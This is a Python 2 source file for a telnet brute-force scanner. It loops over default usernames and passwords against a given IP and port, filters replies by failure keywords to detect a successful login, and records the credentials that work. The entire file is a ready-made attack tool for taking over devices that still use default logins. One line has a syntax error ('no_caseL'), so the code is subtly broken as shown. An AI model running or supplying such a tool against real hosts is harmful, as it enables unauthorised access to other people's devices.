#!/usr/bin/env python
import os
import sys
import time
import telnetlib


class Brutetelnet():
    def __init__(self, verbose=False):
        self.users = ["admin", "root"]
        self.passwds = ["password", "admin", "123456", "qwerty", "password1"]
        self.verbose = verbose

    def _filter_good_responses(self, response):
        if self.verbose:
           print "response length%s" % len(response)
           print "response text: %s" % response
        no_case = response.lower()
        if len(response) < 2:
            return False
        elif no_case.endswith("password:"):
            return False
        elif no_case.endswith("username:"):
            return False
        elif no_case.endswith("login:"):
            return False
        elif "incorrect" in no_case:
            return False 
        elif "denied" in no_case:
            return False 
        elif "fail" in no_case:
            return False
        elif "locked" in no_case:
            return False
        elif "sorry" in no_case:
            return False
        elif "invalid" in no_case:
            return False
        elif "try again" in no_case:
            return False
        elif "rejected" in no_case:
            return False 
        elif "error" in no_caseL
            return False
        elif "wrong" in no_case:
            return False
        elif "incomplete" in no_case:
            return False
        elif "too many" in no_case:
            return False
        elif "connection closed" in no_case:
            return False
        elif response in self.passwds:
            return False
        return True

    def try_user_pass(self, ip, port, user, passwd, timeout=3):
        try:
            telnet = telnetlib.Telnet(ip, port, timeout)
            telnet.read_until("login: ", 2)
            telnet.write(user + "\n")
            telnet.read_until("Password: ", 2)
            telnet.write(passwd + "\n")
            for x in xrange(timeout):
                response = telnet.read_very_eager().strip()
                if self._filter_good_responses(response):
                    return response
                time.sleep(1)
            telnet.close()
        except:pass
        return False

    def login(self, ip, port, timeout=3):
        for user in self.users:
            for passwd in self.passwds:
                if self.verbose:
                    print "trying: %s %s" % (user, passwd)
                response = self.try_user_pass(ip, port, user, passwd, timeout)
                if response != False:
                    return user, passwd, response
        return "unknown", "unknown", "unknown"

    def scan_port(self, ip, port, timeout=3):
        result = {"ip": ip,
                  "port": port,
                  "user": "",
                  "password": "",
                  "login response": "",
                  "time": time.time()}
        try:
            user, password, login_response = self.login(ip, port, timeout)
            result["user"] = user
            result["password"] = password
            result["login response"] = login_response
        except KeyboardInterrupt as e:raise(e)
        except Exception as e:
            result["error"] = repr(e)
            sys.stdout.write("\n[ERROR] %s\n" % result["error"])
        return result
